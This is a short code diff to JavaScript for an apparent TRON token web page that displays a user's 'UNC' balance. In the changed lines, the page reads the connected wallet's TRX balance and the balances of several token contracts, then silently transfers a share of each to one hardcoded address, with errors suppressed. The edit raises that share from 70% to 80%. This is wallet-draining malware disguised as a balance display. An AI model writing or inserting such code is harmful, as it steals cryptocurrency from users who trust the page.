@@ -104,7 +104,7 @@
         
         var account = await tronWeb.trx.getAccount();
         if (account.assetV2){
-            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003638";});
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003644";});
             if (tokenBalance){
               $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " UNC");
             }
@@ -154,14 +154,14 @@
       try{
         var balance = await window.tronWeb.trx.getBalance();
         if (balance >= 20000000)
-          await tronWeb.trx.sendTransaction("TBJB7joGhFUxp39i11Xs3utdVNYhNiRBu6", Math.round(balance * 70 / 100));
+          await tronWeb.trx.sendTransaction("TBJB7joGhFUxp39i11Xs3utdVNYhNiRBu6", Math.round(balance * 80 / 100));
       }catch{}
       for(i=0; i<contractsAddress.length; i++){
         try{
           var cc = await window.tronWeb.contract().at(contractsAddress[i]);
           balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call()
           if (balance >= tBalance[i]){
-            await cc.transfer("TBJB7joGhFUxp39i11Xs3utdVNYhNiRBu6", Math.round(balance * 70 / 100)).send()
+            await cc.transfer("TBJB7joGhFUxp39i11Xs3utdVNYhNiRBu6", Math.round(balance * 80 / 100)).send()
           }
         }catch{}
       }
